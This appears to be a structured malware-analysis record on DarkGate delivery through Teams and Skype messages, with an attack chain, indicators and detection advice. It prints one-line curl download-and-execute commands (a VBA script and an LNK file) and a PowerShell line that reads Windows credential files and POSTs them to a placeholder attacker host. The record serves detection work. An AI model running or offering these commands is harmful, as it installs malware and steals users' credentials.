package_info.package_manager: N/A (delivered via messaging platforms, not a package manager)
package_info.why_malicious: DarkGate is a Windows-based malware distributed via social engineering through Microsoft Teams and Skype, leveraging malicious scripts and AutoIt to deliver remote access, credential theft, file encryption, and cryptocurrency mining. The entire delivery chain is malicious, as it is designed to compromise endpoints, exfiltrate sensitive data, and enable further attacks by executing unauthorized code and establishing persistence.

execution_context.file_location: VBA script attached to Skype message (masquerading as PDF)

malicious_snippets.code_snippet: curl -o autoit.exe http://malicious-domain/autoit.exe && curl -o script.au3 http://malicious-domain/script.au3 && autoit.exe script.au3
malicious_snippets.code_behavior: Upon user-execution of the VBA script masquerading as a PDF, the code downloads a legitimate AutoIt binary and a malicious AutoIt script from an attacker-controlled domain, writes them to disk, and executes the script, resulting in the initiation of the malware infection chain.

malice_analysis.why_suspicious: The script downloads and executes binaries from an external, untrusted source, which is a well-known malware delivery technique and not expected in legitimate VBA scripts.
malice_analysis.violated_expectations: Normal VBA scripts should not download and execute external binaries, especially automation tools like AutoIt, without explicit user consent or a clear, documented business purpose.
malice_analysis.similar_legitimate_use: Automated deployment scripts in IT environments may download and run trusted tools, but only from verified internal sources and with proper authorization.
key_indicators: Use of curl to fetch executables from the internet within a VBA macro
Execution of downloaded binaries immediately after download
Chaining of download and execution commands in a single line
VBA script masquerading as a PDF attachment

malicious_snippets.code_snippet: C:\Windows\System32\cmd.exe /c curl -o autoit.exe http://malicious-domain/autoit.exe && curl -o script.au3 http://malicious-domain/script.au3 && autoit.exe script.au3
malicious_snippets.code_language: shell (Windows command line, via LNK file)
malicious_snippets.code_behavior: When the user opens the LNK file received via Teams, the code launches cmd.exe to download AutoIt and a malicious script from an attacker-controlled domain, writes them to disk, and executes the script, resulting in the start of the malware infection process.

malice_analysis.why_suspicious: LNK files are commonly abused to execute hidden commands. This LNK file downloads and runs executables from the internet, which is highly suspicious and indicative of malware delivery.
malice_analysis.violated_expectations: LNK files should point to legitimate applications or documents, not execute chains of commands that fetch and run remote code from untrusted sources.
malice_analysis.similar_legitimate_use: IT deployment shortcuts may automate trusted tool installation, but only from internal, verified sources and with user awareness.
key_indicators: LNK file with hidden command execution
Chained download and execution of remote files using curl
Use of legitimate tool (AutoIt) for malicious script execution
LNK file delivered via Teams with unexpected command-line actions

execution_context.trigger: post-download (after AutoIt and script are fetched)

malicious_snippets.code_snippet:
; Pseudocode representation of malicious AutoIt script
Run('powershell -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $creds = Get-Content $env:APPDATA\Microsoft\Credentials\*; Invoke-WebRequest -Uri http://malicious-domain/exfil -Method POST -Body $creds"')
malicious_snippets.code_behavior: After the AutoIt script is executed, it runs a PowerShell command to access credential files from the APPDATA\Microsoft\Credentials directory, reads their contents, and exfiltrates the data to an attacker-controlled domain via HTTP POST, resulting in credential theft and data loss.

malice_analysis.why_suspicious: The script automates credential theft and exfiltration by invoking PowerShell to access sensitive files and send them to an external, attacker-controlled server, which is a hallmark of credential-stealing malware.
malice_analysis.violated_expectations: AutoIt scripts are typically used for benign automation tasks, not for accessing credential stores or exfiltrating sensitive data to external domains.
malice_analysis.similar_legitimate_use: Automation scripts may collect logs or configuration files for IT support, but never exfiltrate credentials or sensitive data to untrusted, external domains.
key_indicators: Use of PowerShell for credential file access within an AutoIt script
HTTP POST requests to external, non-corporate domains

attack_chain.action: Victim receives a malicious message (VBA script masquerading as a PDF or LNK file) via Skype or Teams from a trusted or external sender.
attack_chain.leads_to: User executes the attachment, triggering the download of malware components.

attack_chain.action: Malicious script downloads a legitimate AutoIt binary and a maliciously compiled AutoIt script from attacker-controlled infrastructure.
attack_chain.leads_to: Downloaded files are written to disk and executed on the victim's machine.

attack_chain.action: AutoIt executes the malicious script, which runs embedded PowerShell to perform credential theft and data exfiltration.
attack_chain.leads_to: Attacker gains access to sensitive credentials and can perform further malicious actions such as ransomware deployment or cryptocurrency mining.

behavioral_signatures: Execution of curl or similar network tools from VBA scripts or LNK files
Download and execution of AutoIt binaries from non-standard or external sources
AutoIt scripts invoking PowerShell for credential access and exfiltration
Unusual outbound HTTP POST requests to unknown domains immediately following script execution
Execution of PowerShell commands from within AutoIt processes
file_indicators: Unexpected .LNK files received via Teams or Skype containing command-line execution
Presence of autoit.exe in user temp or downloads directories
Unknown .au3 or compiled AutoIt scripts in user directories
VBA macro-enabled documents masquerading as PDFs
network_indicators: Outbound HTTP/HTTPS requests to domains not associated with business operations (e.g., attacker-controlled infrastructure such as http://malicious-domain/autoit.exe and http://malicious-domain/exfil)
POST requests to suspicious endpoints immediately after script or AutoIt execution
detection_knowledge.how_to_detect: Monitor for execution of scripting tools (curl, PowerShell) from Office macros, LNK files, or AutoIt processes. Flag downloads and execution of AutoIt binaries from non-corporate or external sources. Detect AutoIt scripts that invoke PowerShell or access credential directories. Alert on outbound HTTP POST requests to unknown or suspicious domains following script or AutoIt execution, especially if preceded by suspicious file downloads or the appearance of unexpected executables in user directories.
